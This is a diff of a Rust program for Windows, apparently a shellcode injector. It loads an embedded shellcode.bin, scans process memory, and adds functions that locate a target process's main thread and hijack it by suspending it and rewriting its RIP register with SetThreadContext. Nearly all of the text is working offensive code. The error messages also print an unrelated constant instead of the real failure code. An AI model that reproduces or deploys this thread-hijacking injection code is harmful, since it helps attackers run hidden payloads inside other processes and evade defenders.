@@ -5,31 +5,53 @@ use std::{
     ptr::null_mut,
 };
 
-use windows_sys::Win32::{
-    Foundation::{
-        CloseHandle, ERROR_PRINTER_DRIVER_BLOCKED, HANDLE_FLAG_INHERIT, SetHandleInformation,
-    },
-    Security::SECURITY_ATTRIBUTES,
-    Storage::FileSystem::{ReadFile, WriteFile},
-    System::{
-        Diagnostics::Debug::ReadProcessMemory,
-        Memory::{
-            MEM_COMMIT, MEM_PRIVATE, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READ,
-            PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY, PAGE_GUARD, PAGE_NOACCESS,
-            PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY, VirtualQueryEx,
+use windows_sys::{
+    Wdk::System::Threading::{NtQueryInformationThread, ThreadQuerySetWin32StartAddress},
+    Win32::{
+        Foundation::{
+            CloseHandle, ERROR_PRINTER_DRIVER_BLOCKED, HANDLE_FLAG_INHERIT, INVALID_HANDLE_VALUE,
+            SetHandleInformation,
         },
-        Pipes::{CreatePipe, PeekNamedPipe},
-        SystemInformation::{GetNativeSystemInfo, SYSTEM_INFO},
-        Threading::{
-            CREATE_NEW_CONSOLE, CreateProcessA, CreateProcessW, PROCESS_INFORMATION,
-            STARTF_USESHOWWINDOW, STARTF_USESTDHANDLES, STARTUPINFOA, STARTUPINFOW, Sleep,
+        Security::SECURITY_ATTRIBUTES,
+        Storage::FileSystem::{ReadFile, WriteFile},
+        System::{
+            Diagnostics::{
+                Debug::{
+                    CONTEXT, CONTEXT_CONTROL_AMD64, GetThreadContext, ReadProcessMemory,
+                    SetThreadContext, WriteProcessMemory,
+                },
+                ToolHelp::{
+                    CreateToolhelp32Snapshot, MODULEENTRY32W, Module32FirstW, TH32CS_SNAPMODULE,
+                    TH32CS_SNAPMODULE32, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First,
+                    Thread32Next,
+                },
+            },
+            Memory::{
+                MEM_COMMIT, MEM_PRIVATE, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READ,
+                PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY, PAGE_GUARD, PAGE_NOACCESS,
+                PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY, VirtualQueryEx,
+            },
+            Pipes::{CreatePipe, PeekNamedPipe},
+            SystemInformation::{GetNativeSystemInfo, SYSTEM_INFO},
+            Threading::{
+                CREATE_NEW_CONSOLE, CreateProcessA, CreateProcessW, OpenThread,
+                PROCESS_INFORMATION, ResumeThread, STARTF_USESHOWWINDOW, STARTF_USESTDHANDLES,
+                STARTUPINFOA, STARTUPINFOW, Sleep, SuspendThread, THREAD_GET_CONTEXT,
+                THREAD_QUERY_INFORMATION, THREAD_QUERY_LIMITED_INFORMATION, THREAD_SET_CONTEXT,
+                THREAD_SUSPEND_RESUME,
+            },
         },
+        UI::WindowsAndMessaging::SW_SHOW,
     },
-    UI::WindowsAndMessaging::SW_SHOW,
 };
 
 const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
 const SHELLCODE_SIZE: usize = SHELLCODE.len();
+
+#[repr(C, align(16))]
+struct AlignedContext {
+    ctx: CONTEXT,
+}
 
 fn read_from_pipe(h_pipe_read: *mut c_void) -> String {
     unsafe {
@@ -167,7 +189,7 @@ fn find_pattern(h_process: *mut c_void, pattern: &[u8]) -> usize {
                     if ReadProcessMemory(
                         h_process,
                         mbi.BaseAddress,
-                        xbuffer.as_mut() as *mut c_void,
+                        buffer.as_mut() as *mut c_void,
                         region_size,
                         &mut bytes_read,
                     ) != 0
@@ -189,6 +211,141 @@ fn find_pattern(h_process: *mut c_void, pattern: &[u8]) -> usize {
     }
 
     0
+}
+
+fn get_main_thread_id(pid: u32) -> u32 {
+    unsafe {
+        let mut image_base: usize = 0;
+        let mut image_end: usize = 0;
+
+        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
+        if snap != INVALID_HANDLE_VALUE {
+            let mut me = zeroed::<MODULEENTRY32W>();
+            me.dwSize = size_of::<MODULEENTRY32W>() as u32;
+            if Module32FirstW(snap, &mut me) != 0 {
+                image_base = me.modBaseAddr as usize;
+                image_end = image_base + me.modBaseSize as usize;
+            }
+            CloseHandle(snap);
+        }
+
+        let mut best: u32 = 0;
+        let mut first_any: u32 = 0;
+
+        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        if snap == INVALID_HANDLE_VALUE {
+            return 0;
+        }
+
+        let mut te = zeroed::<THREADENTRY32>();
+        te.dwSize = size_of::<THREADENTRY32>() as u32;
+
+        if Thread32First(snap, &mut te) != 0 {
+            loop {
+                if te.th32OwnerProcessID == pid {
+                    if first_any == 0 {
+                        first_any = te.th32ThreadID;
+                    }
+
+                    let ht = OpenThread(
+                        THREAD_QUERY_INFORMATION | THREAD_QUERY_LIMITED_INFORMATION,
+                        0,
+                        te.th32ThreadID,
+                    );
+                    if !ht.is_null() {
+                        let mut start_addr: usize = 0;
+                        NtQueryInformationThread(
+                            ht,
+                            ThreadQuerySetWin32StartAddress,
+                            &mut start_addr as *mut _ as *mut c_void,
+                            size_of::<usize>() as u32,
+                            null_mut(),
+                        );
+                        CloseHandle(ht);
+
+                        if start_addr != 0
+                            && image_base != 0
+                            && image_end != 0
+                            && start_addr >= image_base
+                            && start_addr < image_end
+                        {
+                            best = te.th32ThreadID;
+                            break;
+                        }
+                    }
+                }
+
+                if Thread32Next(snap, &mut te) == 0 {
+                    break;
+                }
+            }
+        }
+        CloseHandle(snap);
+
+        if best != 0 { best } else { first_any }
+    }
+}
+
+fn hijack_thread_rip(tid: u32, new_rip: u64, resume_after: bool) -> bool {
+    unsafe {
+        let ht = OpenThread(
+            THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
+            0,
+            tid,
+        );
+        if ht.is_null() {
+            println!("[-] OpenThread failed: {}", ERROR_PRINTER_DRIVER_BLOCKED);
+            return false;
+        }
+
+        if SuspendThread(ht) == u32::MAX {
+            println!("[-] SuspendThread failed: {}", ERROR_PRINTER_DRIVER_BLOCKED);
+            CloseHandle(ht);
+            return false;
+        }
+
+        let mut aligned: AlignedContext = zeroed();
+        let ctx = &mut aligned.ctx;
+        ctx.ContextFlags = CONTEXT_CONTROL_AMD64;
+
+        if GetThreadContext(ht, ctx as *mut CONTEXT) == 0 {
+            println!(
+                "[-] GetThreadContext failed: {}",
+                ERROR_PRINTER_DRIVER_BLOCKED
+            );
+            ResumeThread(ht);
+            CloseHandle(ht);
+            return false;
+        }
+
+        println!(
+            "[+] Thread {}: old RIP = 0x{:X}, RSP = 0x{:X}",
+            tid, ctx.Rip, ctx.Rsp
+        );
+
+        ctx.Rip = new_rip;
+
+        if SetThreadContext(ht, ctx as *const CONTEXT) == 0 {
+            println!(
+                "[-] SetThreadContext failed: {}",
+                ERROR_PRINTER_DRIVER_BLOCKED
+            );
+            ResumeThread(ht);
+            CloseHandle(ht);
+            return false;
+        }
+        println!("[+] Thread {}: new RIP = 0x{:X}", tid, new_rip);
+
+        if resume_after {
+            if ResumeThread(ht) == u32::MAX {
+                println!("[-] ResumeThread failed: {}", ERROR_PRINTER_DRIVER_BLOCKED);
+            } else {
+                println!("[+] Thread {} resumed", tid);
+            }
+        }
+        CloseHandle(ht);
+        true
+    }
 }
 
 fn main() {
